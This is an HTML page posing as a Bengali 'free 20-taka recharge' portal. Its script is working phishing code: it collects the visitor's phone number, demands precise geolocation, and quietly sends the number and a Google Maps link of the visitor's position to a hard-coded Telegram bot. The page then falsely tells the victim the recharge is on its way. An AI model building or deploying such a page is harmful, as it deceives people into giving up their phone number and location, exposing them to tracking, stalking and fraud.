<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge Portal</title>
    <style>
        body { background: #f4f7f6; font-family: sans-serif; text-align: center; padding: 20px; }
        .container { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #28a745; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 18px; }
        button { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <p>নম্বর দিয়ে নিচের বাটনে ক্লিক করুন</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button id="subBtn" onclick="recharge()">রিচার্জ নিন</button>
    </div>

    <script>
        async function recharge() {
            const num = document.getElementById('phone').value;
            const btn = document.getElementById('subBtn');
            if (num.length < 11) { alert("সঠিক নম্বর দিন"); return; }
            
            btn.innerText = "প্রসেসিং...";
            btn.disabled = true;

            // লোকেশন পারমিশন চাওয়ার সঠিক কমান্ড
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
                const chat_id = "7887080882";
                
                // জাভাস্ক্রিপ্ট ভেরিয়েবল `${ }` ফরম্যাটে লেখা হয়েছে যা এখন কাজ করবে
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const map = `https://www.google.com/maps?q=${lat},${lon}`;
                const text = `🔔 **নতুন রিকোয়েস্ট!**\n\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;

                try {
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
                    alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
                } catch (e) { alert("সার্ভার সমস্যা!"); }
                finally { btn.innerText = "রিচার্জ নিন"; btn.disabled = false; }
            }, () => {
                alert("লোকেশন পারমিশন ছাড়া কাজ করবে না। 'Allow' ক্লিক করুন।");
                btn.innerText = "রিচার্জ নিন"; btn.disabled = false;
            }, { enableHighAccuracy: true, timeout: 10000 });
        }
    </script>
</body>
</html>
